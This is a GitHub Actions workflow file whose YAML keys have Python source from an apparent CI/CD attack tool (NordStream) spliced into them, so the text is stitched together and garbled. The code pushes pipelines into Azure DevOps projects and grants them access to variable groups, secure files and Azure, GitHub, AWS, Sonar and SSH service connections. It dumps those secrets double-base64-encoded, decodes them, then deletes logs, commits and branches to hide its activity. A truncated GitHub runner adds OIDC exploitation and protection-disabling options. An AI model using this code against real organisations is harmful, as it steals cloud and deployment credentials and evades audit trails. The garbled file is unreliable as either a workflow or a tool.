# This workflow will install Python dependencies, run tests and lint with a variety of Python versions
# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python

name: Python package

on: import logging
import base64
import time

from os import makedirs, chdir
from os.path import exists, realpath
from nordstream.yaml.devops import DevOpsPipelineGenerator
from nordstream.utils.errors import GitError, RepoCreationError, DevOpsError
from nordstream.utils.log import logger
from nordstream.utils.helpers import isAllowed
from nordstream.git import Git
import subprocess


class DevOpsRunner:
    _cicd = None
    _extractVariableGroups = True
    _extractSecureFiles = True
    _extractAzureServiceconnections = True
    _extractGitHubServiceconnections = True
    _extractAWSServiceconnections = True
    _extractSonarServiceconnections = True
    _extractSSHServiceConnections = True
    _yaml = None
    _writeAccessFilter = False
    _pipelineFilename = "azure-pipelines.yml"
    _output = None
    _cleanLogs = True
    _resType = {"default": 0, "doubleb64": 1, "github": 2, "azurerm": 3}
    _pushedCommitsCount = 0
    _branchAlreadyExists = False
    _allowedTypes = ["azurerm", "github", "aws", "sonarqube", "ssh"]

    def __init__(self, cicd):
        self._cicd = cicd
        self.__createLogDir()

    @property
    def extractVariableGroups(self):
        return self._extractVariableGroups

    @extractVariableGroups.setter
    def extractVariableGroups(self, value):
        self._extractVariableGroups = value

    @property
    def extractSecureFiles(self):
        return self._extractSecureFiles

    @extractSecureFiles.setter
    def extractSecureFiles(self, value):
        self._extractSecureFiles = value

    @property
    def extractAzureServiceconnections(self):
        return self._extractAzureServiceconnections

    @extractAzureServiceconnections.setter
    def extractAzureServiceconnections(self, value):
        self._extractAzureServiceconnections = value

    @property
    def extractGitHubServiceconnections(self):
        return self._extractGitHubServiceconnections

    @extractGitHubServiceconnections.setter
    def extractGitHubServiceconnections(self, value):
        self._extractGitHubServiceconnections = value

    @property
    def extractAWSServiceconnections(self):
        return self._extractAWSServiceconnections

    @extractAWSServiceconnections.setter
    def extractAWSServiceconnections(self, value):
        self._extractAWSServiceconnections = value

    @property
    def extractSonarerviceconnections(self):
        return self._extractSonarServiceconnections

    @extractSonarerviceconnections.setter
    def extractSonarerviceconnections(self, value):
        self._extractSonarServiceconnections = value

    @property
    def extractSSHServiceConnections(self):
        return self._extractSSHServiceConnections

    @extractSSHServiceConnections.setter
    def extractSSHServiceConnections(self, value):
        self._extractSSHServiceConnections = value

    @property
    def output(self):
        return self._output

    @output.setter
    def output(self, value):
        self._output = value

    @property
    def cleanLogs(self):
        return self._cleanLogs

    @cleanLogs.setter
    def cleanLogs(self, value):
        self._cleanLogs = value

    @property
    def yaml(self):
        return self._yaml

    @yaml.setter
    def yaml(self, value):
        self._yaml = realpath(value)

    @property
    def writeAccessFilter(self):
        return self._writeAccessFilter

    @writeAccessFilter.setter
    def writeAccessFilter(self, value):
        self._writeAccessFilter = value

    def __createLogDir(self):
        self._cicd.outputDir = realpath(self._cicd.outputDir) + "/azure_devops"
        makedirs(self._cicd.outputDir, exist_ok=True)

    def listDevOpsProjects(self):
        logger.info("Listing all projects:")
        for p in self._cicd.projects:
            name = p.get("name")
            logger.raw(f"- {name}\n", level=logging.INFO)

    def listDevOpsUsers(self):
        logger.info("Listing all users:")
        for p in self._cicd.listUsers():
            origin = p.get("origin")
            displayName = p.get("displayName")
            mailAddress = p.get("mailAddress")
            res = f"- {displayName}"

            if mailAddress != "":
                res += f" / {mailAddress}"

            res += f" ({origin})\n"
            logger.raw(res, level=logging.INFO)

    def getProjects(self, project):
        if project:
            if exists(project):
                with open(project, "r") as file:
                    for project in file:
                        self._cicd.addProject(project.strip())

            else:
                self._cicd.addProject(project)
        else:
            self._cicd.listProjects()

        if self._writeAccessFilter:
            self._cicd.filterWriteProjects()

        if len(self._cicd.projects) == 0:
            if self._writeAccessFilter:
                logger.critical("No project with write access found.")
            else:
                logger.critical("No project found.")

    def listProjectSecrets(self):
        logger.info("Listing secrets")
        for project in self._cicd.projects:
            projectName = project.get("name")
            projectId = project.get("id")
            logger.info(f'"{projectName}" secrets')
            self.__displayProjectVariableGroupsSecrets(projectId)
            self.__displayProjectSecureFiles(projectId)
            self.__displayServiceConnections(projectId)
            logger.empty_line()

    def __displayProjectVariableGroupsSecrets(self, project):

        try:
            secrets = self._cicd.listProjectVariableGroupsSecrets(project)
        except DevOpsError as e:
            logger.error(e)

        else:
            if len(secrets) != 0:
                for variableGroup in secrets:
                    logger.info(f"Variable group: \"{variableGroup.get('name')}\"")
                    for sec in variableGroup.get("variables"):
                        logger.raw(f"\t- {sec}\n", logging.INFO)

    def __displayProjectSecureFiles(self, project):

        try:
            secureFiles = self._cicd.listProjectSecureFiles(project)
        except DevOpsError as e:
            logger.error(e)
        else:
            if secureFiles:
                for sf in secureFiles:
                    logger.info(f'Secure file: "{sf["name"]}"')

    def __displayServiceConnections(self, projectId):

        try:
            serviceConnections = self._cicd.listServiceConnections(projectId)
        except DevOpsError as e:
            logger.error(e)
        else:
            if len(serviceConnections) != 0:
                logger.info("Service connections:")
                for sc in serviceConnections:
                    scType = sc.get("type")
                    scName = sc.get("name")
                    logger.raw(f"\t- {scName} ({scType})\n", logging.INFO)

    def __checkSecrets(self, project):
        projectId = project.get("id")
        projectName = project.get("name")
        secrets = 0

        if (
            self._extractAzureServiceconnections
            or self._extractGitHubServiceconnections
            or self._extractAWSServiceconnections
            or self._extractSonarServiceconnections
            or self._extractSSHServiceConnections
        ):

            try:
                secrets += len(self._cicd.listServiceConnections(projectId))
            except DevOpsError as e:
                logger.error(f"Error while listing service connection: {e}")

        if self._extractVariableGroups:

            try:
                secrets += len(self._cicd.listProjectVariableGroupsSecrets(projectId))
            except DevOpsError as e:
                logger.error(f"Error while listing variable groups: {e}")

        if self._extractSecureFiles:

            try:
                secrets += len(self._cicd.listProjectSecureFiles(projectId))
            except DevOpsError as e:
                logger.error(f"Error while listing secure files: {e}")

        if secrets == 0:
            logger.info(f'No secrets found for project "{projectName}" / "{projectId}"')
            return False
        return True

    def createYaml(self, pipelineType):
        pipelineGenerator = DevOpsPipelineGenerator()
        if pipelineType == "github":
            pipelineGenerator.generatePipelineForGitHub("#FIXME")
        elif pipelineType == "azurerm":
            pipelineGenerator.generatePipelineForAzureRm("#FIXME")
        elif pipelineType == "aws":
            pipelineGenerator.generatePipelineForAWS("#FIXME")
        elif pipelineType == "sonar":
            pipelineGenerator.generatePipelineForSonar("#FIXME")
        elif pipelineType == "ssh":
            pipelineGenerator.generatePipelineForSSH("#FIXME")
        else:
            pipelineGenerator.generatePipelineForSecretExtraction({"name": "", "variables": ""})

        logger.success("YAML file: ")
        pipelineGenerator.displayYaml()
        pipelineGenerator.writeFile(self._output)

    def __extractPipelineOutput(self, projectId, resType=0, resultsFilename="secrets.txt"):
        with open(
            f"{self._cicd.outputDir}/{self._cicd.org}/{projectId}/{self._fileName}",
            "rb",
        ) as output:
            try:
                if resType == self._resType["doubleb64"]:
                    pipelineResults = self.__doubleb64(output)
                elif resType == self._resType["github"]:
                    pipelineResults = self.__extractGitHubResults(output)
                elif resType == self._resType["azurerm"]:
                    pipelineResults = self.__azureRm(output)
                elif resType == self._resType["default"]:
                    pipelineResults = output.read()
                else:
                    logger.exception("Invalid type checkout: _resType")
            except:
                output.seek(0)
                pipelineResults = output.read()

        logger.success("Output:")
        logger.raw(pipelineResults, logging.INFO)

        with open(f"{self._cicd.outputDir}/{self._cicd.org}/{projectId}/{resultsFilename}", "ab") as file:
            file.write(pipelineResults)

    @staticmethod
    def __extractGitHubResults(output):
        decoded = DevOpsRunner.__doubleb64(output)
        for line in decoded.split(b"\n"):
            if b"AUTHORIZATION" in line:
                try:
                    return base64.b64decode(line.split(b" ")[-1]) + b"\n"
                except Exception as e:
                    logger.error(e)
        return None

    @staticmethod
    def __doubleb64(output):
        # well it's working
        data = output.readlines()[-3].split(b" ")[1]
        return base64.b64decode(base64.b64decode(data))

    @staticmethod
    def __azureRm(output):
        # well it's working
        data = output.readlines()[-3].split(b" ")[1]
        return base64.b64decode(base64.b64decode(data))

    def __launchPipeline(self, project, pipelineId, pipelineGenerator):
        logger.verbose(f"Launching pipeline.")

        pipelineGenerator.writeFile(f"./{self._pipelineFilename}")
        pushOutput = Git.gitPush(self._cicd.branchName)
        pushOutput.wait()

        try:
            if b"Everything up-to-date" in pushOutput.communicate()[1].strip():
                logger.error("Error when pushing code: Everything up-to-date")
                logger.warning(
                    "Your trying to push the same code on an existing branch, modify the yaml file to push it."
                )

            elif pushOutput.returncode != 0:
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)

            else:
                self._pushedCommitsCount += 1
                logger.raw(pushOutput.communicate()[1])

                # manual trigger because otherwise is difficult to get the right runId
                run = self._cicd.runPipeline(project, pipelineId)

                self.__checkRunErrors(run)

                runId = run.get("id")
                pipelineStatus = self._cicd.waitPipeline(project, pipelineId, runId)

                if pipelineStatus == "succeeded":
                    logger.success("Pipeline has successfully terminated.")
                    return runId

                elif pipelineStatus == "failed":
                    self.__displayFailureReasons(project, runId)
                    return None

        except Exception as e:
            logger.error(e)
        finally:
            pass

    def __displayFailureReasons(self, projectId, runId):
        logger.error("Workflow failure:")
        for reason in self._cicd.getFailureReason(projectId, runId):
            logger.error(f"{reason}")

    def __extractVariableGroupsSecrets(self, projectId, pipelineId):
        logger.verbose(f"Getting variable groups secrets")

        try:
            variableGroups = self._cicd.listProjectVariableGroupsSecrets(projectId)
        except DevOpsError as e:
            logger.error(e)

        else:
            if len(variableGroups) > 0:
                for variableGroup in variableGroups:
                    pipelineGenerator = DevOpsPipelineGenerator()
                    pipelineGenerator.generatePipelineForSecretExtraction(variableGroup)

                    logger.verbose(
                        f'Checking (and modifying) pipeline permissions for variable group: "{variableGroup["name"]}"'
                    )
                    if not self._cicd.authorizePipelineForResourceAccess(
                        projectId, pipelineId, variableGroup, "variablegroup"
                    ):
                        continue

                    variableGroupName = variableGroup.get("name")

                    logger.info(f'Extracting secrets for variable group: "{variableGroupName}"')
                    runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
                    if runId:
                        self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                        if self._fileName:
                            self.__extractPipelineOutput(projectId, self._resType["doubleb64"])

                        logger.empty_line()

            else:
                logger.info("No variable groups found")

    def __extractSecureFiles(self, projectId, pipelineId):
        logger.verbose(f"Getting secure files")

        try:
            secureFiles = self._cicd.listProjectSecureFiles(projectId)
        except DevOpsError as e:
            logger.error(e)

        else:
            if secureFiles:
                for secureFile in secureFiles:
                    pipelineGenerator = DevOpsPipelineGenerator()
                    pipelineGenerator.generatePipelineForSecureFileExtraction(secureFile["name"])

                    logger.verbose(
                        f'Checking (and modifying) pipeline permissions for the secure file: "{secureFile["name"]}"'
                    )
                    if not self._cicd.authorizePipelineForResourceAccess(
                        projectId, pipelineId, secureFile, "securefile"
                    ):
                        continue

                    logger.info(f'Extracting secure file: "{secureFile["name"]}"')
                    runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
                    if runId:
                        self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                        if self._fileName:
                            date = time.strftime("%Y-%m-%d_%H-%M-%S")
                            safeSecureFilename = "".join(
                                [c for c in secureFile["name"] if c.isalpha() or c.isdigit() or c in (" ", ".")]
                            ).strip()
                            self.__extractPipelineOutput(
                                projectId,
                                self._resType["doubleb64"],
                                f"pipeline_{date}_secure_file_{safeSecureFilename}",
                            )

                        logger.empty_line()
            else:
                logger.info("No secure files found")

    def __extractGitHubSecrets(self, projectId, pipelineId, sc):
        endpoint = sc.get("name")

        pipelineGenerator = DevOpsPipelineGenerator()
        pipelineGenerator.generatePipelineForGitHub(endpoint)

        logger.info(f'Extracting secrets for GitHub: "{endpoint}"')
        runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
        if runId:
            self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
            if self._fileName:
                self.__extractPipelineOutput(projectId, self._resType["github"])

        logger.empty_line()

    def __extractAzureRMSecrets(self, projectId, pipelineId, sc):

        scheme = sc.get("authorization").get("scheme").lower()
        if scheme == "serviceprincipal":
            name = sc.get("name")
            pipelineGenerator = DevOpsPipelineGenerator()
            pipelineGenerator.generatePipelineForAzureRm(name)

            logger.info(f'Extracting secrets for AzureRM: "{name}"')
            runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
            if runId:
                self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                if self._fileName:
                    self.__extractPipelineOutput(projectId, self._resType["azurerm"])

                logger.empty_line()
        else:
            logger.error(f"Unsupported scheme: {scheme}")

    def __extractAWSSecrets(self, projectId, pipelineId, sc):

        scheme = sc.get("authorization").get("scheme").lower()
        if scheme == "usernamepassword":

            name = sc.get("name")

            pipelineGenerator = DevOpsPipelineGenerator()
            pipelineGenerator.generatePipelineForAWS(name)

            logger.info(f'Extracting secrets for AWS: "{name}"')
            runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
            if runId:
                self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
                if self._fileName:
                    self.__extractPipelineOutput(projectId, self._resType["doubleb64"])

                logger.empty_line()
        else:
            logger.error(f"Unsupported scheme: {scheme}")

    def __extractSonarSecrets(self, projectId, pipelineId, sc):
        endpoint = sc.get("name")

        pipelineGenerator = DevOpsPipelineGenerator()
        pipelineGenerator.generatePipelineForSonar(endpoint)

        logger.info(f'Extracting secrets for Sonar: "{endpoint}"')
        runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
        if runId:
            self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
            if self._fileName:
                self.__extractPipelineOutput(projectId, self._resType["doubleb64"])

        logger.empty_line()

    def __extractSSHSecrets(self, projectId, pipelineId, sc):
        endpoint = sc.get("name")

        pipelineGenerator = DevOpsPipelineGenerator()
        pipelineGenerator.generatePipelineForSSH(endpoint)

        logger.info(f'Extracting secrets for ssh: "{endpoint}"')
        runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
        if runId:
            self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
            if self._fileName:
                self.__extractPipelineOutput(projectId, self._resType["doubleb64"])

        logger.empty_line()

    def __extractServiceConnectionsSecrets(self, projectId, pipelineId):

        try:
            serviceConnections = self._cicd.listServiceConnections(projectId)
        except DevOpsError as e:
            logger.error(e)
        else:
            for sc in serviceConnections:

                scType = sc.get("type").lower()

                if scType in self._allowedTypes:
                    logger.verbose(
                        f'Checking (and modifying) pipeline permissions for the service connection: "{sc["name"]}"'
                    )
                    if not self._cicd.authorizePipelineForResourceAccess(projectId, pipelineId, sc, "endpoint"):
                        continue

                    if self._extractAzureServiceconnections and scType == "azurerm":
                        self.__extractAzureRMSecrets(projectId, pipelineId, sc)
                    elif self._extractGitHubServiceconnections and scType == "github":
                        self.__extractGitHubSecrets(projectId, pipelineId, sc)
                    elif self._extractAWSServiceconnections and scType == "aws":
                        self.__extractAWSSecrets(projectId, pipelineId, sc)
                    elif self._extractSonarServiceconnections and scType == "sonarqube":
                        self.__extractSonarSecrets(projectId, pipelineId, sc)
                    elif self._extractSSHServiceConnections and scType == "ssh":
                        self.__extractSSHSecrets(projectId, pipelineId, sc)

    def manualCleanLogs(self):
        logger.info("Deleting logs")
        for project in self._cicd.projects:
            projectId = project.get("id")
            logger.info(f"Cleaning logs for project: {projectId}")
            self._cicd.cleanAllLogs(projectId)

    def __runSecretsExtractionPipeline(self, projectId, pipelineId):
        if self._extractVariableGroups:
            self.__extractVariableGroupsSecrets(projectId, pipelineId)

        if self._extractSecureFiles:
            self.__extractSecureFiles(projectId, pipelineId)

        if (
            self._extractAzureServiceconnections
            or self._extractGitHubServiceconnections
            or self._extractAWSServiceconnections
            or self._extractSonarServiceconnections
            or self._extractSSHServiceConnections
        ):
            self.__extractServiceConnectionsSecrets(projectId, pipelineId)

    def __pushEmptyFile(self):
        Git.gitCreateDummyFile("README.md")

        pushOutput = Git.gitPush(self._cicd.branchName)
        pushOutput.wait()

        try:
            if pushOutput.returncode != 0:
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)
            else:
                logger.raw(pushOutput.communicate()[1])

        except Exception as e:
            logger.exception(e)

    def __createRemoteRepo(self, projectId):
        repo = self._cicd.createGit(projectId)
        if repo.get("id"):
            repoId = repo.get("id")
            logger.info(f'New remote repository created: "{self._cicd.repoName}" / "{repoId}"')
            return repo
        else:
            return None

    def __getRemoteRepo(self, projectId):
        for repo in self._cicd.listRepositories(projectId):
            if self._cicd.repoName == repo.get("name"):
                return repo, False

        repo = self.__createRemoteRepo(projectId)
        if repo != None:
            return repo, True

        raise RepoCreationError("No repo found")

    def __deleteRemoteBranch(self):
        logger.verbose("Deleting remote branch")
        deleteOutput = Git.gitDeleteRemote(self._cicd.branchName)
        deleteOutput.wait()

        if deleteOutput.returncode != 0:
            logger.error(f"Error deleting remote branch {self._cicd.branchName}")
            logger.raw(deleteOutput.communicate()[1], logging.INFO)
            return False
        return True

    def __clean(self, projectId, repoId, deleteRemoteRepo, deleteRemotePipeline):
        if self._cleanLogs:
            if deleteRemotePipeline:
                logger.verbose("Deleting remote pipeline.")
                self._cicd.deletePipeline(projectId)

        if deleteRemoteRepo:
            logger.verbose("Deleting remote repository.")
            self._cicd.deleteGit(projectId, repoId)

        else:
            if self._pushedCommitsCount > 0:

                if self._cleanLogs:
                    logger.info(f"Cleaning logs for project: {projectId}")
                    self._cicd.cleanAllLogs(projectId)

                logger.verbose("Cleaning commits.")
                if self._branchAlreadyExists and self._cicd.branchName != self._cicd.defaultBranchName:
                    Git.gitUndoLastPushedCommits(self._cicd.branchName, self._pushedCommitsCount)
                else:
                    if not self.__deleteRemoteBranch():
                        logger.info("Cleaning remote branch.")
                        # rm everything if we can't delete the branch (only leave one file otherwise it will try to rm the branch)
                        Git.gitCleanRemote(self._cicd.branchName, leaveOneFile=True)

    def __createPipeline(self, projectId, repoId):
        logger.info("Getting pipeline")
        self.__pushEmptyFile()

        for pipeline in self._cicd.listPipelines(projectId):
            if pipeline.get("name") == self._cicd.pipelineName:
                return pipeline.get("id"), False

        pipelineId = self._cicd.createPipeline(projectId, repoId, f"{self._pipelineFilename}")
        if pipelineId:
            return pipelineId, True
        else:
            raise Exception("unable to create a pipeline")

    def __runCustomPipeline(self, projectId, pipelineId):
        pipelineGenerator = DevOpsPipelineGenerator()
        pipelineGenerator.loadFile(self._yaml)

        logger.info("Running arbitrary pipeline")
        runId = self.__launchPipeline(projectId, pipelineId, pipelineGenerator)
        if runId:
            self._fileName = self._cicd.downloadPipelineOutput(projectId, runId)
            if self._fileName:
                self.__extractPipelineOutput(projectId)

            logger.empty_line()

    def runPipeline(self):
        for project in self._cicd.projects:
            projectId = project.get("id")
            repoId = None
            deleteRemoteRepo = False
            deleteRemotePipeline = False

            # skip if no secrets
            if not self._yaml:
                if not self.__checkSecrets(project):
                    continue

            try:
                # Create or get first repo of the project
                repo, deleteRemoteRepo = self.__getRemoteRepo(projectId)
                repoId = repo.get("id")
                self._cicd.repoName = repo.get("name")
                logger.info(f'Getting remote repository: "{self._cicd.repoName}" /' f' "{repoId}"')

                url = f"https://foo:{self._cicd.token}@dev.azure.com/{self._cicd.org}/{projectId}/_git/{self._cicd.repoName}"

                if not Git.gitClone(url):
                    raise GitError("Fail to clone the repository")

                chdir(self._cicd.repoName)

                self._branchAlreadyExists = Git.gitRemoteBranchExists(self._cicd.branchName)
                Git.gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

                pipelineId, deleteRemotePipeline = self.__createPipeline(projectId, repoId)

                if self._yaml:
                    self.__runCustomPipeline(projectId, pipelineId)
                else:
                    self.__runSecretsExtractionPipeline(projectId, pipelineId)

            except (GitError, RepoCreationError) as e:
                name = project.get("name")
                logger.error(f"Error in project {name}: {e}")

            except KeyboardInterrupt:
                self.__clean(projectId, repoId, deleteRemoteRepo, deleteRemotePipeline)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{self._cicd.repoName}", shell=True).wait()

            except Exception as e:
                logger.error(f"Error during pipeline run: {e}")
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)

                self.__clean(projectId, repoId, deleteRemoteRepo, deleteRemotePipeline)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{self._cicd.repoName}", shell=True).wait()

            else:
                self.__clean(projectId, repoId, deleteRemoteRepo, deleteRemotePipeline)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{self._cicd.repoName}", shell=True).wait()

    def describeToken(self):
        response = self._cicd.getUser()
        logger.info("Token information:")

        username = response.get("authenticatedUser").get("properties").get("Account").get("$value")
        if username != "":
            logger.raw(f"\t- Username: {username}\n", logging.INFO)

        id = response.get("authenticatedUser").get("id")
        if id != "":
            logger.raw(f"\t- Id: {id}\n", logging.INFO)

    def __checkRunErrors(self, run):
        if run.get("customProperties") != None:
            validationResults = run.get("customProperties").get("ValidationResults", [])

            msg = ""
            for res in validationResults:
                if res.get("result", "") == "error":

                    if "Verify the name and credentials being used" in res.get("message", ""):
                        raise DevOpsError("The stored token is not valid anymore.")

                    msg += res.get("message", "") + "\n"

            raise DevOpsError(msg)

    def parseExtractList(self, extractList, allow=True):

        extractList = extractList.split(",") if extractList else []

        self._extractVariableGroups = isAllowed("vg", extractList, allow)
        self._extractSecureFiles = isAllowed("sf", extractList, allow)
        self._extractAzureServiceconnections = isAllowed("vg", extractList, allow)
        self._extractGitHubServiceconnections = isAllowed("az", extractList, allow)
        self._extractAWSServiceconnections = isAllowed("aws", extractList, allow)
        self._extractSonarServiceconnections = isAllowed("sonar", extractList, allow)
        self._extractSSHServiceConnections = isAllowed("ssh", extractList, allow) 
  push: from nordstream.utils.log import logger
import logging
from nordstream.core.github.protections import getUsersArray, getTeamsOrAppsArray


def displayRepoSecrets(secrets):
    if len(secrets) != 0:
        logger.info("Repo secrets:")
        for secret in secrets:
            logger.raw(f"\t- {secret}\n", logging.INFO)


def displayDependabotRepoSecrets(secrets):
    if len(secrets) != 0:
        logger.info("Dependabot repo secrets:")
        for secret in secrets:
            logger.raw(f"\t- {secret}\n", logging.INFO)


def displayEnvSecrets(env, secrets):
    if len(secrets) != 0:
        logger.info(f"{env} secrets:")
        for secret in secrets:
            logger.raw(f"\t- {secret}\n", logging.INFO)


def displayOrgSecrets(secrets):
    if len(secrets) != 0:
        logger.info("Repository organization secrets:")
        for secret in secrets:
            logger.raw(f"\t- {secret}\n", logging.INFO)


def displayDependabotOrgSecrets(secrets):
    if len(secrets) != 0:
        logger.info("Dependabot organization secrets:")
        for secret in secrets:
            logger.raw(f"\t- {secret}\n", logging.INFO)


def displayEnvSecurity(envDetails):
    protectionRules = envDetails.get("protection_rules")
    envName = envDetails.get("name")

    if len(protectionRules) > 0:
        logger.info(f'Environment protection for: "{envName}":')
        for protection in protectionRules:
            if protection.get("type") == "required_reviewers":
                for reviewer in protection.get("reviewers"):
                    reviewerType = reviewer.get("type")
                    login = reviewer.get("reviewer").get("login")
                    userId = reviewer.get("reviewer").get("id")
                    logger.raw(
                        f"\t- reviewer ({reviewerType}): {login}/{userId}\n",
                        logging.INFO,
                    )
            elif protection.get("type") == "wait_timer":
                wait = protection.get("wait_timer")
                logger.raw(f"\t- timer: {wait} min\n", logging.INFO)
            else:
                branchPolicy = envDetails.get("deployment_branch_policy")
                if branchPolicy.get("custom_branch_policies", False):
                    logger.raw(f"\t- deployment branch policy: custom\n", logging.INFO)
                else:
                    logger.raw(f"\t- deployment branch policy: protected\n", logging.INFO)
    else:
        logger.info(f'No environment protection rule found for: "{envName}"')


def displayBranchProtectionRules(protections):
    logger.info("Branch protections:")

    logger.raw(
        f'\t- enforce admins: {protections.get("enforce_admins").get("enabled")}\n',
        logging.INFO,
    )
    logger.raw(
        "\t- block creations:" f' {protections.get("block_creations").get("enabled")}\n',
        logging.INFO,
    )
    logger.raw(
        "\t- required signatures:" f' {protections.get("required_signatures").get("enabled")}\n',
        logging.INFO,
    )
    logger.raw(
        "\t- allow force pushes:" f' {protections.get("allow_force_pushes").get("enabled")}\n',
        logging.INFO,
    )
    logger.raw(
        "\t- allow deletions:" f' {protections.get("allow_deletions").get("enabled")}\n',
        logging.INFO,
    )

    if protections.get("restrictions"):
        displayRestrictions(protections.get("restrictions"))

    if protections.get("required_pull_request_reviews"):
        displayRequiredPullRequestReviews(protections.get("required_pull_request_reviews"))
    else:
        logger.raw(f"\t- required pull request reviews: False\n", logging.INFO)

    if protections.get("required_status_checks"):
        displayRequiredStatusChecks(protections.get("required_status_checks"))

    logger.raw(
        "\t- required linear history:" f' {protections.get("required_linear_history").get("enabled")}\n',
        logging.INFO,
    )
    logger.raw(
        "\t- required conversation resolution:"
        f' {protections.get("required_conversation_resolution").get("enabled")}\n',
        logging.INFO,
    )
    logger.raw(
        f'\t- lock branch: {protections.get("lock_branch").get("enabled")}\n',
        logging.INFO,
    )
    logger.raw(
        "\t- allow fork syncing:" f' {protections.get("allow_fork_syncing").get("enabled")}\n',
        logging.INFO,
    )


def displayRequiredStatusChecks(data):

    logger.raw(f"\t- required status checks:\n", logging.INFO)
    logger.raw(f'\t    - strict: {data.get("strict")}\n', logging.INFO)

    if len(data.get("contexts")) != 0:
        logger.raw(f'\t    - contexts: {data.get("contexts")}\n', logging.INFO)

    if len(data.get("checks")) != 0:
        logger.raw(f'\t    - checks: {data.get("checks")}\n', logging.INFO)


def displayRequiredPullRequestReviews(data):

    logger.raw(f"\t- pull request reviews:\n", logging.INFO)
    logger.raw(f'\t    - approving review count: {data.get("required_approving_review_count")}\n', logging.INFO)
    logger.raw(f'\t    - require code owner reviews: {data.get("require_code_owner_reviews")}\n', logging.INFO)
    logger.raw(f'\t    - require last push approval: {data.get("require_last_push_approval")}\n', logging.INFO)
    logger.raw(f'\t    - dismiss stale reviews: {data.get("dismiss_stale_reviews")}\n', logging.INFO)

    if data.get("dismissal_restrictions"):
        users = getUsersArray(data.get("dismissal_restrictions").get("users"))
        teams = getTeamsOrAppsArray(data.get("dismissal_restrictions").get("teams"))
        apps = getTeamsOrAppsArray(data.get("dismissal_restrictions").get("apps"))

        if len(users) != 0 or len(teams) != 0 or len(apps) != 0:
            logger.raw(f"\t    - dismissal_restrictions:\n", logging.INFO)

            if len(users) != 0:
                logger.raw(f"\t        - users: {users}\n", logging.INFO)
            if len(teams) != 0:
                logger.raw(f"\t        - teams: {teams}\n", logging.INFO)
            if len(apps) != 0:
                logger.raw(f"\t        - apps: {apps}\n", logging.INFO)

    if data.get("bypass_pull_request_allowances"):
        users = getUsersArray(data.get("bypass_pull_request_allowances").get("users"))
        teams = getTeamsOrAppsArray(data.get("bypass_pull_request_allowances").get("teams"))
        apps = getTeamsOrAppsArray(data.get("bypass_pull_request_allowances").get("apps"))

        if len(users) != 0 or len(teams) != 0 or len(apps) != 0:
            logger.raw(f"\t    - bypass pull request allowances:\n", logging.INFO)

            if len(users) != 0:
                logger.raw(f"\t        - users: {users}\n", logging.INFO)
            if len(teams) != 0:
                logger.raw(f"\t        - teams: {teams}\n", logging.INFO)
            if len(apps) != 0:
                logger.raw(f"\t        - apps: {apps}\n", logging.INFO)


def displayRestrictions(data):
    users = getUsersArray(data.get("users"))
    teams = getTeamsOrAppsArray(data.get("teams"))
    apps = getTeamsOrAppsArray(data.get("apps"))

    if len(users) != 0 or len(teams) != 0 or len(apps) != 0:
        logger.raw(f"\t- person allowed to push to restricted branches (restrictions):\n", logging.INFO)

        if len(users) != 0:
            logger.raw(f"\t    - users: {users}\n", logging.INFO)
        if len(teams) != 0:
            logger.raw(f"\t    - teams: {teams}\n", logging.INFO)
        if len(apps) != 0:
            logger.raw(f"\t    - apps: {apps}\n", logging.INFO) 
    branches: [ "main" ]
  pull_request: import logging
import base64
import glob
from zipfile import ZipFile
from os import makedirs, chdir
from os.path import exists, realpath, basename
from nordstream.yaml.github import WorkflowGenerator
from nordstream.yaml.custom import CustomGenerator
from nordstream.core.github.protections import (
    resetRequiredStatusCheck,
    resetRequiredPullRequestReviews,
    resetRestrictions,
)
from nordstream.core.github.display import *
from nordstream.utils.errors import GitHubError, GitPushError, GitHubBadCredentials
from nordstream.utils.log import logger, NordStreamLog
from nordstream.utils.helpers import randomString
from nordstream.utils.constants import DEFAULT_WORKFLOW_FILENAME
from nordstream.git import Git
import subprocess


class GitHubWorkflowRunner:
    _cicd = None
    _taskName = "command"
    _workflowFilename = DEFAULT_WORKFLOW_FILENAME
    _fileName = None
    _env = None
    _extractRepo = True
    _extractEnv = True
    _extractOrg = True
    _yaml = None
    _exploitOIDC = False
    _tenantId = None
    _subscriptionId = None
    _clientId = None
    _role = None
    _region = None
    _forceDeploy = False
    _disableProtections = None
    _writeAccessFilter = False
    _branchAlreadyExists = False
    _pushedCommitsCount = 0
    _cleanLogs = True

    def __init__(self, cicd, env):
        self._cicd = cicd
        self._env = env
        self.__createLogDir()

    @property
    def extractRepo(self):
        return self._extractRepo

    @extractRepo.setter
    def extractRepo(self, value):
        self._extractRepo = value

    @property
    def extractEnv(self):
        return self._extractEnv

    @extractEnv.setter
    def extractEnv(self, value):
        self._extractEnv = value

    @property
    def extractOrg(self):
        return self._extractOrg

    @extractOrg.setter
    def extractOrg(self, value):
        self._extractOrg = value

    @property
    def workflowFilename(self):
        return self._workflowFilename

    @workflowFilename.setter
    def workflowFilename(self, value):
        self._workflowFilename = value

    @property
    def yaml(self):
        return self._yaml

    @yaml.setter
    def yaml(self, value):
        self._yaml = realpath(value)

    @property
    def exploitOIDC(self):
        return self._exploitOIDC

    @exploitOIDC.setter
    def exploitOIDC(self, value):
        self._exploitOIDC = value

    @property
    def tenantId(self):
        return self._tenantId

    @tenantId.setter
    def tenantId(self, value):
        self._tenantId = value

    @property
    def subscriptionId(self):
        return self._subscriptionId

    @subscriptionId.setter
